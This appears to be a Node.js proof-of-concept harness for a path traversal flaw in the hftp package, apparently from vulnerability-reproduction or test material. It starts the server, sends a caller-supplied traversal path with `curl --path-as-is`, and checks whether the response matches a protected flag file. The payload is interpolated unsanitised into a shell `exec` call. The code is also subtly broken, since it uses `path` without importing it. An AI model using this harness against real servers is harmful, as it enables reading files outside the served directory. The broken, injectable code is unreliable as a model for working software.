const { exec } = require("child_process");
const fs = require("fs");
const { sleep } = require("sleep");

function exploitFunction(payload) {
  const pathToFlag = path.resolve(__dirname, "../flag.html");
  const hostsFile = fs.readFileSync(pathToFlag).toString();

  let server = "node ./node_modules/hftp/bin/hftp";
  let exe = exec(server, (error, stdout) => {});

  sleep.sleep(2);

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;

  return new Promise((resolve) => {
    let val = exec(attack_string, (error, stdout) => {
      if (stdout === hostsFile) {
        resolve(true);
      } else {
        resolve(false);
      }
    });
  });
}

module.exports = { exploitFunction };